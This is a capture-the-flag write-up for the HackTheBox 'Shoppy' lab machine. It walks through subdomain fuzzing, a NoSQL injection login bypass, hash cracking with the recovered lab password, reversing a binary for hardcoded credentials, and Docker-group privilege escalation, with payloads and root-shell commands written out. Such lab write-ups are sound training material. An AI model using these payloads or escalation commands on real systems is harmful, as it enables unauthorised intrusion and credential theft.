# HTB Shoppy — Full Writeup

## Box Info

| Field | Value |
|---|---|
| Platform | HackTheBox |
| OS | Linux |
| Difficulty | Easy |
| Stack | Nginx / Node.js / MongoDB / Mattermost / Docker |
| Key Concepts | NoSQL injection, subdomain enumeration, password manager reversing, Docker group privesc |

## Attack Flow

Nmap → Discover shoppy.htb → NoSQL injection on login form → Dump user credentials → Crack MD5 hash → Find mattermost.shoppy.htb → Login to Mattermost → Find jaeger SSH creds in channel → SSH as jaeger → Find password-manager binary in deploy's home → Reverse it to get deploy's password → su deploy → Docker group → Mount root filesystem → root

## Phase 1: Enumeration

Nmap found port 22 (SSH) and port 80 (HTTP/Nginx). Add to `/etc/hosts`:

```
10.10.x.x shoppy.htb
```

The main site is a shop-themed page. Directory brute force with ffuf or gobuster to find `/login`.

### Subdomain Enumeration

```bash
ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 169
```

Discovers `mattermost.shoppy.htb`. Add it to `/etc/hosts`.

## Phase 2: NoSQL Injection — Login Bypass

The login form at `http://shoppy.htb/login` is backed by MongoDB (NoSQL). Standard SQL injection won't work here.

NoSQL injection payload for the username field:

```
admin'||'1'=='1
```

Or URL encoded in the request:

```
username=admin'||'1'=='1&password=anything
```

This bypasses authentication because the query evaluates to true regardless of the password.

### NoSQL vs SQL Injection

| SQL Injection | NoSQL Injection |
|---|---|
| `' OR 1=1-- -` | `'||'1'=='1` |
| Targets MySQL, PostgreSQL, etc. | Targets MongoDB, CouchDB, etc. |
| Uses SQL syntax | Uses JavaScript/JSON operators |
| `UNION SELECT` for data extraction | Operator injection (`$gt`, `$ne`, `$regex`) |

## Phase 3: User Enumeration and Hash Cracking

After bypassing login, there's a search functionality to look up users. Use the same NoSQL injection to dump all users:

```
admin'||'1'=='1
```

This returns all user entries with their password hashes. Found two users:
- `admin` — MD5 hash
- `josh` — MD5 hash (`6ebcea65320589ca4f2f1ce039975995`)

Crack with hashcat:

```bash
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Result: `josh` → `remembermethisway`

The admin hash didn't crack with rockyou — not needed for the attack path.

## Phase 4: Mattermost — Credential Discovery

Login to `http://mattermost.shoppy.htb` with `josh` / `remembermethisway`.

Inside the internal channel, find SSH credentials for `jaeger`.

```bash
ssh jaeger@shoppy.htb
```

User flag in `/home/jaeger/user.txt`.

## Phase 5: Lateral Movement — jaeger to deploy

### Password Manager Binary

Found `/home/deploy/password-manager` — a custom binary. Transfer it to Kali for analysis:

```bash
# From Kali
scp jaeger@shoppy.htb:/home/deploy/password-manager /tmp/password-manager
```

Quick analysis with strings:

```bash
strings /tmp/password-manager | grep -i pass
```

Or reverse it with Ghidra to find the master password hardcoded in the binary. The binary asks for a password and if correct, reveals deploy's credentials.

```bash
./password-manager
# Enter the master password found via reversing
```

This gives deploy's password. Switch user:

```bash
su deploy
```

## Phase 6: Privilege Escalation — deploy to root

### Docker Group

Check deploy's groups:

```bash
id
```

Deploy is a member of the `docker` group. This is an instant root — if you can run Docker, you can mount the host filesystem.

### Docker Root

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

This mounts the entire host root filesystem (`/`) into the container at `/mnt`, then chroots into it. You now have a root shell on the host filesystem.

```bash
cat /root/root.txt
```

### Why Docker Group = Root

The Docker daemon runs as root. If a user is in the `docker` group, they can create containers with arbitrary volume mounts. Mounting `/` gives full read/write access to the host as root. This is why adding users to the docker group is considered a security risk equivalent to giving them sudo.

Other ways to abuse docker group:
- Mount `/etc/shadow` and crack root's hash
- Mount `/root/.ssh/` and add your public key
- Mount `/etc/passwd` and add a root-level user

## Methodology Notes

### NoSQL Injection

When you suspect MongoDB (Node.js apps, JSON-heavy responses, no SQL errors):
- Try `'||'1'=='1` instead of `' OR 1=1-- -`
- Operator injection: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
- `$regex` for data extraction: `{"username": {"$regex": "^a"}}`
- Common in Node.js + Express + MongoDB stacks
- Look for JSON content types in requests

### Subdomain Enumeration

Always fuzz for subdomains on HTB:
```bash
ffuf -u http://target.htb -H "Host: FUZZ.target.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

Use `-fs` to filter out the default response size (check what a non-existent subdomain returns first).

### Reversing Binaries for Credentials

When you find a custom binary:
1. `strings binary | grep -i pass` — quick check for hardcoded creds
2. `ltrace ./binary` — trace library calls, shows strcmp comparisons
3. Ghidra — full decompilation for complex binaries
4. `strace ./binary` — trace system calls

### Docker Group Privilege Escalation

Check for it with `id` command. If the user is in docker group:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Always check:
- `id` — group memberships (docker, lxd, disk, adm)
- `docker images` — available images
- If no images: `docker pull alpine` (if internet access) or use `--rm` flag

### Mattermost Credential Hunting

Same pattern as Delivery box:
- Check all channels for posted credentials
- Internal/dev channels often have plaintext passwords
- Config file at `/opt/mattermost/config/config.json` contains DB creds
- User table in the database has password hashes

### ffuf Tips

- Default threads: 40. Increase with `-t 100` or `-t 150`
- Filter by size: `-fs 3122`
- Filter by status: `-fc 404`
- Filter by words: `-fw 10`
- Filter by lines: `-fl 5`
- Use `-mc all` to show all status codes, then filter
